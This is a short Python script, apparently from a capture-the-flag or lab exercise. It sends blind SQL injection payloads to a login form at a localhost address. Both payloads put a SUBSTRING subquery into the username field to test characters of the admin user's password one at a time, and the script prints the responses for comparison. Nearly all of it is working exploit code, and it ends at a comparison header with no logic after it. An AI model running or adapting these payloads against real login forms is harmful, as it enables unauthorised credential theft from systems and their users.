import requests
import json

TARGET_URL = "http://127.0.0.1:33038/index.php"

print("[*] Testing Blind SQLi with submit parameter")

# Test TRUE condition - should return JSON with "response":"password"
print("\n[*] Testing TRUE condition")
payload_true = "' or SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S'-- -"
data_true = {
    "username": payload_true,
    "password": "test",
    "submit": "submit"
}
response_true = requests.post(TARGET_URL, data=data_true)
print(f"[*] Response text: {response_true.text}")

# Test FALSE condition - should return JSON with "response":"username"
print("\n[*] Testing FALSE condition")
payload_false = "' or SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='Z'-- -"
data_false = {
    "username": payload_false,
    "password": "test",
    "submit": "submit"
}
response_false = requests.post(TARGET_URL, data=data_false)
print(f"[*] Response text: {response_false.text}")

print("\n[*] Comparing responses:")
